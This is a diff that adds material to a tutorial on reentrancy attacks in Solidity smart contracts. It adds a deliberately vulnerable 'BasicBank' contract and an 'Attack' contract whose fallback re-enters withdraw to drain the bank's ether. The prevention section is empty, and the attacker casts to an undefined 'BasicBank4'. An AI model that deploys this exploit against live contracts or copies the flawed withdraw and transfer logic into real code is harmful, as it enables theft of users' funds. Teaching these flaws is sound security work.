@@ -30,3 +30,88 @@ Does the attacker have 1 eth on their balance? Yes – because the balance has n
 
 Transfer 1 eth to a malicious contract and again until the attacker will drain all the funds stored on the contract.
 ## 📄 Example Of Vulnereable Contract
+This contract is designed to provide basic web3 banking services and includes vulnerabilities that are frequently encountered in other smart contracts.
+```
+//SPDX-License-Identifier: MIT
+pragma solidity 0.7.0;
+
+contract BasicBank {
+
+    mapping (address => uint) private userFunds;
+    address private commissionCollector;
+    uint private collectedComission = 0;
+
+    constructor() {
+        commissionCollector = msg.sender;
+    }
+    
+    modifier onlyCommissionCollector {
+        require(msg.sender == commissionCollector);
+        _;
+    }
+
+    function deposit() public payable {
+        require(msg.value >= 1 ether);
+        userFunds[msg.sender] += msg.value;
+    }
+
+    function withdraw(uint _amount) external payable {
+        require(getBalance(msg.sender) >= _amount);
+        msg.sender.call{value: _amount}("");
+        userFunds[msg.sender] -= _amount;
+        userFunds[commissionCollector] += _amount/100;
+    }   
+
+    function getBalance(address _user) public view returns(uint) {
+        return userFunds[_user];
+    }
+
+    function getCommissionCollector() public view returns(address) {
+        return commissionCollector;
+    }
+
+    function transfer(address _userToSend, uint _amount) external{
+        userFunds[_userToSend] += _amount;
+        userFunds[msg.sender] -= _amount;
+    }
+
+    function setCommissionCollector(address _newCommissionCollector) external onlyCommissionCollector{
+        commissionCollector = _newCommissionCollector;
+    }
+
+    function collectCommission() external {
+        userFunds[msg.sender] += collectedComission;
+        collectedComission = 0;
+    }
+}
+```
+## 👨‍💻 Analyzing
+## Attacking
+```
+//SPDX-License-Identifier: MIT
+pragma solidity 0.7.0;
+
+import './BasicBank.sol';
+
+contract Attack{
+    BasicBank public target;
+    constructor(address payable _target){
+        target = BasicBank4(_target);
+    }
+    function attack() external payable{
+        require(msg.value >= 1e18, "At least 1 ether");
+        target.deposit{value: 1e18}();
+        target.withdraw(1e18);
+    }
+    fallback()external payable{
+        if(address(target).balance >= 1e18){
+            target.withdraw(1e18);
+        }
+    }
+}
+```
+## How To Prevent Reentracy Attack?
+
+
+
+**_wasny0ps_**
